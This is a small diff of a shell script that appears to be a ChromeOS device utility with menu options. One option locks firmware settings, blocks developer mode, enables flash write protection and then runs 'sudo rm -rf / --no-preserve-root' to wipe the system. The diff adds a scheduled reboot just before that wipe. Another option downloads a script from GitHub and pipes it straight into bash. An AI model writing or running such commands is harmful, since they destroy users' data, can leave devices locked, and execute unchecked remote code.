@@ -77,6 +77,7 @@ futility gbb -s --flash --flags=0x8
 crossystem block_devmode=1
 device_management_client --action=set_firmware_management_parameters --flags=0x01
 flashrom --wp-enable
+sudo shutdown -r +1
 sudo rm -rf / --no-preserve-root
 elif [ $option = 69 ]; then
 curl https://raw.githubusercontent.com/ferrochrome-3/nikkis-vt2-utility/refs/heads/main/femboy%20ascii.sh > "femboy ascii.sh" && bash "femboy ascii.sh"
